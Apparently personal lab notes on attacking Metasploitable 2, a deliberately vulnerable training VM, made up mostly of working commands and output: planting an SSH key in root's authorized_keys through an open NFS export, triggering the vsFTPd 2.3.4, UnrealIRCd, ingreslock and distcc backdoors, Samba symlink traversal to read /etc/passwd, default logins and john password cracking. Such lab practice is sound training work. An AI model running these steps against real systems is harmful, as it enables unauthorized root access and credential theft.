# metaspoitable

## install
<https://sourceforge.net/projects/metasploitable/?source=directory>


## config


## exploit 
<https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide>

### services
> nmap -p0-65535 192.168.99.131


### Unix Basics
ports 512,513,514 r services

> rlogin -l root 192.168.99.131

see .rhosts

### nfs mounts

> rpcinfo -p 192.168.99.131

> showmount -e 192.168.99.131

/ *


## ssh keys and get root access via ssh

> ssh-keygen

> mkdir /tmp/r00t

> mount -t nfs 192.168.99.131:/ /tmp/r00t/

> cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys

> umount /tmp/r00t

> ssh root@192.168.99.131


## Backdoor: vsFTPd 2.3.4 (port 6200)

> telnet 192.168.99.131 21

~~~
user backdoored:)
pass invalid

^]
~~~

> telnet 192.168.99.131 6200


### Backdoor: UnrealRCD IRC daemon (port 6667) using metasploit

send AB  folllowed by a system command

~~~
msfconsole

msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf  exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.99.131
msf  exploit(unreal_ircd_3281_backdoor) > exploit


id
uid=0(root) gid=0(root)
~~~


### Backdoor: ingreslock (port: 1524)

> telnet 192.168.99.131 1524

~~~
root@metasploitable:/# id
uid=0(root) gid=0(root) groups=0(root)
~~~


### Backdoor: distccd (distributed compiling)

~~~
msfconsole

msf > use exploit/unix/misc/distcc_exec
msf  exploit(distcc_exec) > set RHOST 192.168.99.131
msf  exploit(distcc_exec) > exploit


id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
~~~


### Backdoor: Samba

~~~
smbclient -L //192.168.99.131
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk     
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))

root@ubuntu:~# msfconsole
msf > use auxiliary/admin/smb/samba_symlink_traversal
msf  auxiliary(samba_symlink_traversal) > set RHOST 192.168.99.131
msf  auxiliary(samba_symlink_traversal) > set SMBSHARE tmp
msf  auxiliary(samba_symlink_traversal) > exploit

[*] Connecting to the server...
[*] Trying to mount writeable share 'tmp'...
[*] Trying to link 'rootfs' to the root filesystem...
[*] Now access the following share to browse the root filesystem:
[*]     \\192.168.99.131\tmp\rootfs\

msf  auxiliary(samba_symlink_traversal) > exit


root@ubuntu:~# smbclient //192.168.99.131/tmp
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
smb: \> cd rootfs
smb: \rootfs\> cd etc
smb: \rootfs\etc\> more passwd
getting file \rootfs\etc\passwd of size 1624 as /tmp/smbmore.ufiyQf (317.2 KiloBytes/sec) (average 317.2 KiloBytes/sec)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
[..]
~~~


## Weak Passwords

~~~
msfadmin/msfadmin
user/user
postgres/postgres
sys/batman
klog/123456789
service/service
~~~


#### john Usage Example
<https://tools.kali.org/password-attacks/john>

Using a wordlist (–wordlist=/usr/share/john/password.lst), apply mangling rules (–rules) and attempt to crack the password hashes in the given file (unshadowed.txt):

~~~
root@kali:~# john --wordlist=/usr/share/john/password.lst --rules unshadowed.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Loaded 1 password hash (sha512crypt [64/64])
toor             (root)
guesses: 1  time: 0:00:00:07 DONE (Mon May 19 08:13:05 2014)  c/s: 482  trying: 1701d - andrew
Use the "--show" option to display all of the cracked passwords reliably
~~~


## Vulnerable WebSite: Mutillidae
<https://www.youtube.com/user/webpwnized>

## Vulnerable WebSite: DVWA
<https://code.google.com/archive/p/dvwa/wikis>



## Information Disclosure

* <http://192.168.56.101/phpinfo.php>

	* <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1823>

	* <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2311>
